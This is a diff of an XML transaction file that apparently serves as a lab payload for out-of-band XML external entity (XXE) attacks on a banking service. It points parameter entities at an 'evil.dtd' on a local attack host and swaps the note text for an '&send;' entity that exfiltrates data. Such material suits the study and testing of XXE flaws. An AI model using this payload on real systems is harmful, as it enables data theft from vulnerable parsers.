@@ -7,8 +7,8 @@
         <!ELEMENT note (#PCDATA)>
         <!ELEMENT transaction (fromAccountNo, toAccountNo, amount, currency, note)>
         <!ELEMENT transactions (transaction*)>
-        <!ENTITY % victim SYSTEM 'http://service.127.0.0.1.xip.io:9090/victim?outOfBand=true'>
-        <!ENTITY % dtd SYSTEM "http://attack.127.0.0.1.xip.io:9090/xml/evil.dtd">
+        <!ENTITY % victim SYSTEM 'http://localhost:9090/victim?outOfBand=true'>
+        <!ENTITY % dtd SYSTEM "http://localhost:9090/xml/evil.dtd">
         %dtd;
         ]>
 <transactions>
@@ -17,6 +17,6 @@
         <toAccountNo>2-123456-22</toAccountNo>
         <amount>100</amount>
         <currency>CHF</currency>
-        <note>Please check the logs ;)</note>
+        <note>&send;</note>
     </transaction>
 </transactions>
